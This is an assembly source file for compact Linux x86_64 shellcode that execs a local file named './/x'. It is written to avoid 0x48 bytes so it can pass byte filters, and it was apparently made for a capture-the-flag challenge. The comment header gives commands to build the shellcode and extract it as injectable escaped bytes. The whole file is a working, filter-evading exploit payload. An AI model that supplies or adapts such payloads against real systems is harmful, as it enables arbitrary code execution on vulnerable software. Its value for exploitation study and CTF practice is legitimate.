#
# exec-no-H.s - Tiny Linux/x86_64 exec without 0x48 bytes
# Copyright (c) 2025 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# Simple shellcode inspired by a challenge that shall remain unnamed to 
# prevent spoilers.
#
# Useful commands:
# $ gcc -nostdlib -static shellcode.s -o shellcode-elf
# $ objdump -M intel -d shellcode-elf
# $ strace ./shellcode-elf
# $ objcopy --dump-section .text=shellcode-raw shellcode-elf
# $ xxd -p shellcode-raw | tr -d '\n' | sed 's/../\\x&/g'
#

.intel_syntax noprefix
.global _start

.text
_start:
    # execve(".//x", NULL, NULL)
    push 0x782f2f2e
    push rsp
    pop rdi             # ".//x"

    push 1
    pop rsi
    dec esi             # 0 (NULL)

    push 1
    pop rdx
    dec edx             # 0 (NULL)

    mov al, 59
    syscall             # execve
